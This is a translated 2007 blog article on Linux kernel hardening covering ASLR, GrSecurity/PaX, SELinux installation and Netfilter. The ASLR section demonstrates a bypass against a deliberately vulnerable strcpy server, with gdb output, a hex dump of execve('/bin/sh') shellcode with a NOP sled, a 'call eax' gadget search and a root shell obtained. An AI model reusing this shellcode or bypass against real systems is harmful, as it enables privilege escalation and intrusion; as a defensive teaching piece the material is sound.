---
weight: 999
url: "/Renforcement_des_fonctions_de_sécurité_du_noyau_Linux/"
title: "Strengthening Linux Kernel Security Functions"
description: "An overview of various security mechanisms for Linux kernels to ensure system integrity protection, including Address Space Layout Randomization, GrSecurity, PaX, SELinux, and network security."
categories:
  - Debian
  - Security
  - Networking
date: "2007-11-15T21:30:00+02:00"
lastmod: "2007-11-15T21:30:00+02:00"
tags:
  - GrSecurity
  - PaX
  - SELinux
  - ASLR
  - Kernel
  - Linux
  - Security
toc: true
---

## Introduction

This article offers an overview of various security mechanisms related to the kernels of GNU/Linux operating systems to ensure the integrity protection of your environment. In this first part, you'll find an introduction to these mechanisms as well as to GNU/Linux system kernels in general.

## Presentation

The growing enthusiasm of users for the Linux operating system, particularly from security experts or system administrators, is largely due to the robustness and advanced features this operating system offers. The kernel, the core of the system, manages most of the security-related functions in the environment.

Linux's development process and quality are now widely recognized. It relies on a very large community of experts and enthusiasts who contribute to the project's evolution and continuous improvements. This is indeed a particularly decisive property when choosing equipment for a secure infrastructure.

Security patches for Linux systems are published very quickly, and it's not uncommon to have them available within 24 hours following the publication of a security vulnerability on a full-disclosure type list (bugtraq, etc.).

Several security-related features are natively integrated into the Linux kernel. These include management of syncookies, which helps address SYN flood attacks, filtering functionality provided by Netfilter, and other less explicit features that strengthen the overall security of the system.

An important distinction must be made between network security managed at the operating system level (IP ID randomization, socket restrictions, layer 3 filtering, etc.) and application security that helps prevent or limit the exploitation of higher-level software vulnerabilities. These generally belong to the user land.

The Linux kernel used in this article is 2.6.16.9, the latest stable version at the time of writing. Later versions will have the same features and will certainly offer new ones. The various patches presented in the following chapters should be retrieved according to the version used, but the approach remains broadly identical.

GrSecurity is probably the best-known project of this type, although it is one of the least financially supported. SELinux (Security Enhanced Linux), on the contrary, has significant resources, being developed by the NSA (National Security Agency - American intelligence organization specialized in new technologies).

The GrSecurity and SELinux approaches are diametrically opposed: GrSecurity strengthens system security upstream, adding numerous application features that make software vulnerabilities very complex to exploit (buffer overflows in the stack, heap, format bugs, race conditions, etc.).

SELinux, on the other hand, opts to restrict the environment available to an attacker following system compromise. The attacker is then restricted with low privileges and confined to the bare minimum. This is a MAC (Mandatory Access Control) approach.

The different approaches, whether placed upstream or downstream of the compromise, will be presented in this article. They all have multiple advantages and disadvantages, particularly in terms of performance. Using both solutions simultaneously, while theoretically possible, proves too burdensome in practice. In security, everything is a matter of compromise...

Technical prerequisites are necessary for a good understanding of this article, particularly those concerning vulnerability exploitation under Linux (buffer/heap overflows mainly). The reader can refer to the abundant literature available on the Internet on this subject.

## Address Space Layout Randomization

ASLR or Address Space Layout Randomization is a Linux kernel feature that randomizes memory address space areas such as the heap or stack to complicate the work of an attacker wishing to compromise a machine via a buffer overflow attack, for example.

A major new feature has recently appeared in the Linux kernel, with native support for the equivalent of ASLR (Address Space Layout Randomization). This makes memory address space random for certain areas, such as the heap or stack.

Indeed, these two memory sections most often contain the buffers of a process. Dynamic allocations (*malloc) are placed in the heap while static ones (char/int/... *buff[SIZE]) are placed in the stack.

The famous media-hyped buffer overflows exploit these memory areas to place a shellcode (sequence of OPCODEs) and then redirect the execution flow to the address containing it.

By making these addresses random, the attacker can no longer use traditional exploitation techniques, making successful exploitation much rarer.

A process named "srv" is launched below. An analysis of the memory areas allocated to the sections shows that the stack is contained between addresses 0xBF7F7000 and 0xBF80D000:

```bash
$srv&
[3027]

$ cat /proc/3027/maps
(...)
0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]
b7da3000-b7da4000 rw-p b7da3000 00:00 0
b7da4000-b7ed2000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so
b7ed2000-b7ed7000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so
b7ed7000-b7eda000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so
b7eda000-b7edc000 rw-p b7eda000 00:00 0
b7ef5000-b7ef8000 rw-p b7ef5000 00:00 0
b7ef8000-b7f0d000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so
b7f0d000-b7f0f000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so
bf7f7000-bf80d000 rw-p bf7f7000 00:00 0 [stack]
ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte
```

When launching the same process a second time, we notice that the stack address has indeed changed and is now between 0xBF865000 and BxBF87B000:

```bash
$srv&
[3593]

$ cat /proc/3593/maps
(...)
0804a000-0806b000 rw-p 0804a000 00:00 0 [heap]
b7e11000-b7e12000 rw-p b7e11000 00:00 0
b7e12000-b7f40000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so
b7f40000-b7f45000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so
b7f45000-b7f48000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so
b7f48000-b7f4a000 rw-p b7f48000 00:00 0
b7f63000-b7f66000 rw-p b7f63000 00:00 0
b7f66000-b7f7b000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so
b7f7b000-b7f7d000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so
bf865000-bf87b000 rw-p bf865000 00:00 0 [stack]
ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte
```

Let's now analyze the more concrete case of a software vulnerability in the example below. It contains the here_is_the_bug function that performs an unbounded buffer copy into "buffer" with a fixed size of 150 bytes (which is placed in the stack):

```bash
(gdb) list here_is_the_bug
20 char * Connection;
21 } browser;
22
23
24 void here_is_the_bug(pbrowser Browser)
25 {
26
27 char buffer[150];
28 if(Browser->UserAgent != NULL)
29 {
30 strcpy(buffer,Browser->UserAgent);
31 }
32 }
```

Using the gdb debugger, let's place two breakpoints (software stop points), before and after rewriting the return address (saved eip) placed in the stack. The buffer is placed here at address 0xBFC73960. After rewriting the buffer, we pass the second breakpoint. The program "normally" crashes (the address used for the rewrite being false and no longer points in the stack):

```bash
(gdb) b 31
Breakpoint 1 at 0x804859e: file srv.c, line 31.

(gdb) run < paquet_mal
Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32
32 }

(gdb) print &buffer
$1 = (char (*)[150]) 0xbfc73960


(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xbffff3a7 in ?? ()
```

When restarting the same executable, at the first breakpoint, we notice the address change: the buffer concerned is now at 0xBF999AE0:

```bash
(gdb) run < paquet_mal
Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32
32 }

(gdb) print &buffer
$2 = (char (*)[150]) 0xbf999ae0
```

It is therefore no longer possible to use so-called classic techniques to redirect the execution flow. At best with this technique, the attacker will cause a DoS (Denial Of Service).

Despite the higher security level that this solution provides, we found while studying it that this protection could be bypassed using indirect means...

At the second breakpoint, placed before returning from the function and after rewriting the return address (the saved eip displayed by gdb, 0xBFFFf3A7 is none other than the one we rewrote), we analyze the register values:

```bash
(gdb) info frame
Stack level 0, frame at 0xbf999b90:
eip = 0x804859e in here_is_the_bug (srv.c:32); saved eip 0xbffff3a7
called by frame at 0xbf999b94
source language c.
Arglist at 0xbf999b88, args: Browser=0xbffff3a7
Locals at 0xbf999b88, Previous frame's sp is 0xbf999b90
Saved registers:
ebp at 0xbf999b88, eip at 0xbf999b8c

(gdb) info registers
eax 0xbf999ae0 -1080452384
ecx 0xbf999bbd -1080452163
```

The value contained in the EAX register is... the address of our buffer! This property is due to the use of the strcpy function. Indeed, if we place ourselves at a lower level (assembly code), the different addresses and values used are placed in the appropriate registers, then a jump to the code of the strcpy function is subsequently performed. Since this function cannot do without the destination address of the buffer, it is logical that it should be placed in an accessible register (here EAX).

Let's verify the hypothesis that the EAX address indeed contains our instruction sequence previously placed in memory (sequence of NOP then shellcode):

```bash
(gdb) x/5bi 0xbf999ae0
0xbf999ae0: nop
0xbf999ae1: nop
0xbf999ae2: nop
0xbf999ae3: nop
0xbf999ae4: nop

(gdb) x/100bx 0xbf999ae0
0xbf999ae0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999ae8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999af0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999af8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999b00: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999b08: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xbf999b10: 0x90 0x90 0x90 0x90 0x90 0x31 0xc0 0x31
0xbf999b18: 0xdb 0x31 0xc9 0xb0 0x46 0xcd 0x80 0x31
0xbf999b20: 0xc0 0x50 0x68 0x2f 0x2f 0x73 0x68 0x68
0xbf999b28: 0x2f 0x62 0x69 0x6e 0x89 0xe3 0x8d 0x54
0xbf999b30: 0x24 0x08 0x50 0x53 0x8d 0x0c 0x24 0xb0
0xbf999b38: 0x0b 0xcd 0x80 0x31 0xc0 0xb0 0x01 0xcd
0xbf999b40: 0x80 0xbf 0xa7 0xf3
```

The 0x90 bytes are the NOPs, mostly used to reduce the heuristic necessary for exploiting a buffer overflow (we could have done without them in this case of exploitation). Incidentally, note the 0xCD80 OPCODEs (in bold above) which represent the call to the execution interrupt to give us a shell on the remote machine (int $0x80).

The exploitation principle is then very clear: we must make the machine execute the equivalent of a jmp %eax or call %eax that will jump directly to our shellcode.

By performing a search in the process memory, thanks to the opcode finder that we developed for the occasion, we find an address (in a fixed addressing area this time) containing the OPCODEs of the "call EAX" instruction:

```bash
# ./memory_dumper 080484b0 0804A4b0 10497 output
Found at 0x8048c03
```

Since the EAX register points to our buffer (which contains a valid shellcode), the bypass is then performed:

```bash
# ./exploit localhost 8000 0
Using align value 0
Trying "call eax" compliant address: 0x08048c03

Linux lapt41p 2.6.16 #3 PREEMPT i686 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)

#
```

More technical information about ASLR is available at the following addresses:

[Lwn.net](https://lwn.net/Articles/121845/)

[Searchopensource.techtarget.com](https://searchopensource.techtarget.com/tip/1,289483,sid39_gci1144658,00.html)

[Metasploit msg 00735](https://www.metasploit.com/archive/framework/msg00735.html)

[Metasploit msg 00736](https://www.metasploit.com/archive/framework/msg00736.html)

Other protections, located in userland via the libc library, allow among other things to protect against exploitations in the heap via the unlink method. They are complementary to an ASLR usage and will not be described in this article.

## GrSecurity and PaX

GrSecurity strengthens the security of userland processes, making it possible to make vulnerability exploitation more complex for an attacker on an operating system. GrSecurity relies on PaX for protections related to kernel and user land memory processing.

GrSecurity offers an "upstream" approach to kernel security enhancements. By this means, the security of processes in userland can also be strengthened. The kernel does indeed play a major role in process management. It defines the use of memory ranges (stack, heap, base address of binary loading, etc.) and execution, read or write zones.

By combining several techniques, it is possible to make particularly complex the exploitation of vulnerabilities present on the system. At best (except for bypassing protections), an attacker will cause a denial of service on the vulnerable process (which can still be critical depending on how it is used), or more seriously, on the kernel.

GrSecurity comes as a kernel patch. It is updated very regularly and is available at the following address.

Many features are integrated into GrSecurity, the most known being PaX which allows adding several protections related to kernel and user land memory processing.

Here is the list of the main GrSecurity features (more technical details are available on the project's official website):

- Role-Based Access Control (RBAC), which allows segmentation of GrSecurity restrictions based on many criteria: user, process, file...
- Control over level 3 network functionalities
- Possibilities of capabilities that can be attributed to non-root users, without prior authentication.
- Scripting support in the configuration (management of variables, logical operators, etc.)
- Object management with possible inheritances for ACL definitions.
- Dynamic creation and deletion of objects.
- Real-time resolution of regular expressions (possible temporal processing)
- Protection of the ptrace system call (dynamic debugging that can be used to circumvent certain protections) according to the user and/or the process.
- /dev/grsec devfs entry allowing kernel land / user land interfacing.
- "Next-generation" code that produces least privilege policies for the entire system without the need for prior configuration.
- Static policies configurable with the gradm tool.
- Possibility of dynamic creation of policies with a learning mode that considerably reduces the work of the system administrator and quickly debugs classic problems caused by the use of ACL.
- Protection on the environment, filenames, etc.
- /proc/<pid>/ipaddr allows listing the remote IP address of the user who initiated a connection or launched a network process.
- Support of read/write/execution of ptrace calls
- Support for PaX flags to protect only certain binaries, or relax the policy on others (particularly useful for an X server for example).
- Protection on shared memory functions.
- Monitoring of certain processor-specific flags (especially in the context of the fight against offensive codes): trojans, spywares...
- Audit functions that can be applied to certain users only (restricted GID)
- Support for restrictions on resources, sockets and capabilities.
- Protection against bruteforces of exploit addresses.
- Protection on procfs /proc/[PID] files (memory, mappings, etc.).
- Possible policy regeneration.
- Configurable log suppression.
- Possible configuration of processes related to account management (creation, deletion, modification...).
- Intuitive and quick configuration.
- Independence of file system and architecture.
- Minimal impact on overall system performance.
- Support for multi-processors (SMP).
- Most operations are performed in O(1) complexity.
- Dynamic activation/deactivation and reloading of capabilities via procfs.
- Option to hide user processes from other "normal" system users.
- procfs (/proc) restrictions on the dissemination of information to "normal users", including on processes belonging to them.
- Restrictions on symbolic and physical links (on inodes) to counter race condition attacks.
- Restrictions on the stack (execution, manipulation, etc.).
- Impossibility for "normal" users to access dmesg information, information often returned by the kernel or by modules.
- Improvement of the implementation of Trusted Path Execution (TPE)
- Socket restrictions by GID (Group ID).
- Great flexibility of configuration thanks to support by syscontrol (sysctrl).
- Locking mechanism of sysctl after configuration (lock).
- Security alerts raised with the attacker's network information (IP, possible DNS resolution...)
- Automatic stopping of processes restarted several times in a reduced time lapse (exploit bruteforces).
- Automatic modes in the configuration: low, medium and high
- Configurable restrictions on flood attacks and/or resource depletion.
- Improvement of randomness generators.
- Random PIDs (Process ID).
- Random TCP source ports
- Logs of executions (executables and arguments).
- Logs on unauthorized resource access attempts.
- Logs of calls to the chdir system call.
- Logs of mount and unmount calls.
- Logs of signals (SIGHUP, SIGKILL...).
- Logs of errors on fork calls.
- Logs of time changes.
- PaX: Implementation of user access to non-executable memory pages (protections on ret-into-libc exploitations) with negligible performance loss on Intel processors.
- PaX: Implementation of user access to non-executable memory segments (protections on ret-into-libc exploitations) with negligible performance loss on Intel processors.
- PaX: Random addresses of stack and base address of loaded files (mmap) on many architectures (i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, and mips).
- PaX: Random heap addresses on i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, and mips architectures.
- PaX: Random base address of executables for i386, sparc, sparc64, alpha, parisc, amd64, ia64, and ppc architectures.
- PaX: Random kernel stack.
- PaX: Automatic emulation by bounces (indirect addressing) on the libc: anti ret-into-libc protection (libc5, glibc 2.0, uClibc, Modula-3...).
- PaX: Emulation of the PLT (Procedure Linkage Table) allowing the loading into memory of function addresses at random addresses.
- Dynamic kernel modifications impossible via the pseudo files /dev/mem, /dev/kmem, or /dev/port.
- Options to prohibit direct access to writes on inputs/outputs (raw IO).
- No attachment to shared memory by chrooted processes.
- No call to kill inside a chroot.
- No call to ptrace inside a chroot.
- No call to setpgid inside a chroot.
- No call to getpgid inside a chroot.
- No call to getuid inside and outside a chroot.
- Impossibility to send signals to processes located outside the current chroot.
- Impossibility to list processes outside a chroot.
- Impossibility to mount/unmount partitions inside a chroot.
- No call to the "pivot" function inside a chroot (known escape method).
- Impossibility to do double chroots (known escape method).
- No fchdir outside a chroot
- Reinforcement of the call to chdir("/") in a chroot
- Impossibility to suid (chmod +s) binaries inside a chroot.
- Impossibility to create special files using mknod inside a chroot.
- No sysctl writing inside a chroot.
- Impossibility to change scheduler priorities inside a chroot (nice).
- Impossibility to connect to abstract UNIX sockets located outside a chroot.
- Logs of executions inside a chroot.

The gradm tool (available on the grsecurity website) and paxctl (available on the PaX website) allow for lightening or increasing GrSecurity/PaX restrictions on binaries, and this on a per-unit basis. It is then possible to exclude binaries from the protections in effect on the system, for example.

The installation is very simple and quick. Just download the latest patch from the GrSecurity website and install it:

```bash
gunzip grsecurity-2.1.8-2.6.14.6-200601211647.patch.gz
cp grsecurity-2.1.8-2.6.14.6-200601211647.patch linux
cd linux
patch -p1 < grsecurity-2.1.8-2.6.14.6-200601211647.patch
patching file security/security.c
(...)
```

Configuration is then done in the classic way with a make menuconfig for example.

GrSecurity and Pax are placed in the "Security options" menu, just like SELinux, alongside other low-level protection means:

```bash
Linux Kernel v2.6.16.9 Configuration
Linux Kernel Configuration
x x Code maturity level options --->
x x General setup --->
x x Loadable module support --->
x x Block layer --->
x x Processor type and features --->
x x Power management options (ACPI, APM) --->
x x Bus options (PCI, PCMCIA, EISA, MCA, ISA) --->
x x Executable file formats --->
x x Networking --->
x x Device Drivers --->
x x File systems --->
x x Instrumentation Support --->
x x Kernel hacking --->
x x Security options --->
x x Cryptographic options --->
x x Library routines --->
x x ---
x x Load an Alternate Configuration File
x x Save Configuration to an Alternate File
```

In the "Security options" menu, PaX and GrSecurity are dissociated. However GrSecurity also offers functionality related to memory management:

```bash
PaX --->
Grsecurity --->
[*] Enable access key retention support
[*] Enable the /proc/keys file by which all keys may be viewed
[*] Enable different security models
[*] Socket and Networking Security Hooks
<*> Default Linux Capabilities
< > Root Plug Support
<*> BSD Secure Levels
```

For Pax, the sub-menus allow fine-tuning of memory protection:

```bash
[*] Enable various PaX features
PaX Control ---> Non-executable pages ---> Address Space Layout Randomization --->
```

GrSecurity configuration is done on the same model:

```bash
[*] Grsecurity
Security Level (Custom) --->
Address Space Protection --->
Role Based Access Control Options --->
Filesystem Protections --->
Kernel Auditing --->
Executable Protections --->
Network Protections --->
Sysctl support --->
Logging Options --->
```

Detailing all the GrSecurity options would be far too long (even the official documentation quickly covers these features). For each feature offered, detailed help in English allows you to understand the precise roles. To access it, you will need to place yourself on the function for which you want to get help, then press the "?" key.

However, be careful with the "Runtime module disabling" option, usually discouraged, unless you want to prohibit or drastically restrict the use of modules (LKM: Linux Kernel Module).

The "sysctl enable" function is also discouraged as it allows for easily "bypassing" GrSecurity if the sysctl lock is not properly placed. So don't enable it if you don't know exactly what it does.

The "W^X" approach (to be read as "Write XOR eXecute") prevents a memory section from being activated for writing and execution simultaneously. As a result, a shellcode placed by a user cannot be executed there. However, there are still ways to bypass this latter technique... As always!

## SELinux

### Part 1

SELinux brings to the kernels of GNU/Linux operating systems its numerous and rich functionalities, notably to restrict the environment in which an attacker could benefit from a successful exploitation. This first part concerns the presentation of these functionalities and the installation of SELinux.

Following long and virulent debates between Linux kernel maintainers, but also between end users, SELinux was finally adopted as the default security solution when moving to kernel versions 2.6.X. The previous stable branch of the kernel (2.4.X) did not offer, by default, any solution of this type; this need had been strongly expressed for several years already.

The choice of SELinux was motivated in particular by the guarantees that this project could bring in terms of maintenance, scalability, but also means. The American NSA services were able (history will probably never tell if complete transparency was in place or not), it seems, to stand out with Linus Torvald to have their solution adopted.

In any case, the quality of SELinux code and the richness of its functionality make it a highly "recommendable" solution for reinforcements on production servers requiring ever more robustness, security, and accessibility.

The SELinux reinforcement approach is therefore based, as we introduced, on the means to restrict as much as possible the environment of an attacker who has partially (user rights) or totally (root rights) compromised the information system. The root user (often called "superuser" because of his unlimited rights on a standard Linux system) is then himself restricted.

As a result, compromising a server implementing SELinux can then be reduced to only local damage of the incriminated vulnerable application (this is not always true by the way!).

The "classic" type of access control management is of the DAC (Discretionary Access Control) type. The one chosen by SELinux is very close to MAC (Mandatory Access Control) with some adaptations, however.

It bears the name of Flask and differs from MLS (Multi-Level Security) type MAC which do not integrate:

- control over data integrity;
- the principle of "least privilege";
- the separation of processes and objects in the ACL (Access Control List) sense of the term.

MLSes are content to ensure the confidentiality of files and certain data according to the users or calls that initiate it.

Flask therefore makes it possible to overcome these different problems by offering adapted counter-measures and by adding protections on:

- Files
- Processes
- Signals, and ptrace-type calls
- Sockets and network flows
- The management of kernel land interfacing via a control on modules, system calls and other biases allowing to reach the system kernel.
- But also on the internal workings of programs thanks to an API allowing to use the SELinux functionalities directly.

At the level of options to configure in the kernel, SELinux has multiple dependencies that will have to be "resolved" before adding support. Depending on the file system used, remember the necessary entries in the "File systems" section of your configuration.

A simple make menuconfig will allow you to define the options you want to use.

Here are the options necessary for its proper functioning:

```bash
"Code maturity level options"
[*] Prompt for development and/or incomplete code/drivers

"General setup"
[*] Auditing support

"File systems"
<*> Second extended fs support
[*] Ext2 extended attributes
[ ] Ext2 POSIX Access Control Lists
[*] Ext2 Security Labels
<*> Ext3 journalling file system support
[*] Ext3 extended attributes
[ ] Ext3 POSIX Access Control Lists
[*] Ext3 security labels
<*> JFS filesystem support
[ ] JFS POSIX Access Control Lists
[*] JFS Security Labels
[ ] JFS debugging
[ ] JFS statistics
<*> XFS filesystem support
[ ] Realtime support (EXPERIMENTAL)
[ ] Quota support
[ ] ACL support
[*] Security Labels

[*] /proc file system support
[ ] /dev file system support (EXPERIMENTAL)
[*] /dev/pts file system for Unix98 PTYs
[*] /dev/pts Extended Attributes
[*] /dev/pts Security Labels
[*] Virtual memory file system support
[*] tmpfs Extended Attributes
[*] tmpfs Security Labels

"Security options"
[*] Enable different security models
[*] Socket and Networking Security Hooks
<*> Capabilities Support
[*] NSA SELinux Support
[*] NSA SELinux boot parameter
[*] NSA SELinux runtime disable
[*] NSA SELinux Development Support
[*] NSA SELinux AVC Statistics
[*] NSA SELinux MLS policy (EXPERIMENTAL)
```

Warning: remember to keep only the bare minimum, especially if it's a production server. So it's unnecessary to compile support for a Tuner card, 3D hardware acceleration, etc.

Once the kernel is fully configured (this phase is often much longer than the compilation phase that follows), the classic steps follow:

```bash
make
make modules
make modules_install
cp arch/i386/bzImage /boot/vmlinux-2.6.16
cp System.map /boot/System.map-2.6.16
cp .config /boot/config-2.6.16
```

Then if you use grub (here with an ide disk), add in the /boot/grub/menu.lst file the following lines with the disk and partition information concerning your machine:

```bash
title Linux-2.6.16
root (hd0,3) # To be adapted according to your configuration
kernel /boot/vmlinuz-2.6.16 root=/dev/hda4
# Adapt root according to your configuration
```

Or lilo (/etc/lilo.conf):

```bash
image=/boot/vmlinuz-2.6.16
label=linux
read-only
root=/dev/hda4
```

The /selinux directory must then be created to store future policy files (SELinux MAC rules):

```bash
mkdir /selinux

chmod 700 /selinux
```

The /etc/fstab file, containing the virtual and physical mount points of the machine, must be completed to include the latest mount relative to SELinux:

```
none /selinux selinuxfs defaults 0 0
```

The kernel and system are configured to use SELinux. A simple restart, selecting the new generated kernel is necessary to continue the deployment.

### Part 2

Find, in this second part devoted to SELinux, the details relating to the configuration of SELinux security rules as well as the presentation of different tools and pre-established rules with the aim of facilitating the security of a system in a maximal way.

Like all systems based on ACL (Access Control List), the configuration of rules is undoubtedly the most delicate phase because the omission of a single rule often means malfunction or simply crash (impossible access to a file, filtered network flow, etc.).

We will not detail the configuration of SELinux rules "point by point", given the multitude of different uses a server can have. On the other hand, we will present the method for defining, then refining the rules in order to obtain the most restrictive but still functional system possible (which is the purpose of this protection, let us remember)...

It is rather unthinkable (or then with a consequent budget!) to redefine the rules for each system process. Several approaches are then possible: use tools allowing to "learn" the behavior of the system (accessed files and resources, etc.) and draw a first basic configuration from it. The second, finer approach is to use the rules proposed by the distribution. Most distributions offer this type of rules.

Let's now focus on the Debian distribution approach, with its selinux-policy-default package. During installation, apt-get asks many questions about the server's intended use. The most common uses (graphical server, mail server, apache server, etc.) are then proposed, and you simply need to answer the questions asked to generate the appropriate rules:

```bash
(...)
Do you want domains/program/ircd.te:Ircd - IRC server
Yes/No/Display [Y/n/d]?
Do you want domains/program/distcc.te:distcc - Distributed compiler daemon
Yes/No/Display [Y/n/d]?
Do you want domains/program/gnome-pty-helper.te:Gnome Terminal - Helper program for GNOME x-terms
Yes/No/Display [Y/n/d]?
Do you want domains/program/uwimapd.te:uw-imapd-ssl server
Yes/No/Display [Y/n/d]?
Do you want domains/program/apache.te:Apache - Web server
Yes/No/Display [Y/n/d]?
Do you want domains/program/klogd.te:Klogd - Kernel log daemon
Yes/No/Display [Y/n/d]?
(...)
```

Once all these default rules are defined, it's advisable to refine the protection by re-checking them and adapting them to the exact use that will be made of them. They are contained in /etc/selinux then transferred in their binary versions in the /selinux directory.

```bash
cd /etc/selinux/(strict|targeted)/src/policy

make relabel
```

Many resources on the configuration of tools, servers are available. Other policies are also available elsewhere.

The most critical patches regarding system security are those of init (sysvinit-selinux.patch under Debian), pam (pam-selinux.patch under Debian), sshd (openssh-selinux.patch under Debian) and crond (vixie-cron-selinux.patch under Debian).

These patches load the policy and initialize the user's security contexts. It is also necessary to modify the pam configuration for login (file /etc/pam.d/login):

```
session required pam_selinux.so multiple
```

The checkpolicy tool allows compiling policy sources to translate them into "binaries" recognized by SELinux. It is therefore necessary to run this tool on the created policies before importing them.

The refpolicy tool, on the other hand, allows creating complete SELinux policies as alternatives to the strict policies available on classic distributions. It is a tool still in the development phase, supported by the "Tresys Technology" team. Many contributors publish the policies they have created, thus making available to the public a wide choice of files. The "getting started" page of the following site also allows to become familiar with the writing of these files.

Note that at the policy level, the following "roles" are intended for users who need additional capabilities on the system:

- staff_r
- sysadm_r
- system_r

While the user_r role is intended for normal users, requiring no special privileges.

It is recommended, depending on the chosen Linux distribution, to install the SELinux-related packages. If you're using the Debian distribution for example, the following packages are more than recommended for optimal operation:

```bash
checkpolicy - SELinux policy compiler
libselinux1 - SELinux shared libraries
libselinux1-dev - SELinux development headers
libsemanage1 - shared libraries used by SELinux policy manipulation tools
libsemanage1-dev - Header files and libraries for SELinux policy manipulation tools
libsepol1 - Security Enhanced Linux policy library for changing policy binaries
polgen - SELinux policy generation scripts
policycoreutils - SELinux core policy utilities
python2.4-selinux - Python2.4 bindings to SELinux shared libraries
python2.4-semanage - Python2.4 bindings for SELinux policy manipulation tools
selinux-basics - SELinux basic support
selinux-doc - documentation for Security-Enhanced Linux
selinux-policy-default - Policy config files and management for NSA Security Enhanced Linux
selinux-utils - SELinux utility programs
slat - Tools for information flow analysis of SELinux policies
polgen-doc - Documentation for SELinux policy generation scripts
```

These packages will take care of the userland part of SELinux, namely the installation of certain patches (especially on the libc to make certain SELinux-specific hooks supportable), the adaptation of sensitive system files (/etc/passwd, /etc/shadow), to prevent the root superuser from modifying them.

The binaries id and ls (ps -eZ) then allow displaying the security contexts and extended attributes on the file system.

At the very end of the configuration, after multiple tests, the enforcing=1 option must be added to the boot loader options at startup (lilo or grub) to make SELinux effective from the moment of loading.

## Netfilter, conclusions & webography

The power of configuring filtering rules with Netfilter on GNU/Linux operating systems is well established, but few ultimately know all the functionalities available with this tool. Also find the conclusions of this file on strengthening the security of Linux kernels as well as all the addresses of cited websites.

The functionalities linked to filtering security, whether at level 2 (MAC/Bridge filtering, ebtables, etc.), or at level 3 (Netfilter and its userland "caller" iptables) are integrated into the kernel. The power of possible modifications is enormous, and it is possible, given time and expertise, to transform a Linux server into a robust network equipment capable of supporting very heavy loads.

Netfilter allows, by default, to perform numerous treatments on packets that transit (INPUT, OUTPUT, and FORWARD chains) but also modifications (mangle table).

New functions are available thanks to the patch-o-matic package which allows adding several advanced functions (processing by UID/GID, pattern-matching, rules reacting to time constraints, etc.).

We will not go into the details specific to such configurations, which could, on their own, be the subject of numerous articles. The reader can refer to the many resources available on the Internet.

Also note the default integration of IPSEC in 2.6.x kernels which allows setting up secure networks, on IP, at lower cost, without necessarily deploying the IPv6 arsenal.

The protections at the Linux kernel level, as we have seen, allow significantly strengthening the overall security of the system. They will reduce to nothing massive exploitations of the script kiddies type or worms. A very experienced attacker, during a targeted attack, could however possibly find a way to circumvent certain protections (cf. chapter on bypassing ASLR).

Zero risk in security, we know well, does not exist and the means of protection are often mistreated by researchers and then rendered obsolete after only a few years.

A Linux server placed in an area considered unsafe (Internet is obviously part of it) should systematically integrate one of these kernel reinforcements. It is possible, by combining these protections, with a correctly defined security policy (password policy, updates, etc.) to reach a very advanced limit.

The last factor, and not the least important, then becomes "human": social engineering, information leaks, and of course physical protection means... But before reaching this level of security, there remains a great deal of work to be done on the means of logical protection!

Note that some specialized distributions are oriented towards these "high security levels". One of the best known some time ago was Adamantix, on a Debian base, which is no longer maintained at the present time... Advice to amateurs!

## Resources
- [SecuObs Article](https://www.secuobs.com/news/14112007-kernel_hardening.shtml)

<!-- Link to "Securing Your Kernel with Grsecurity and PaX" removed - file not found in repository -->
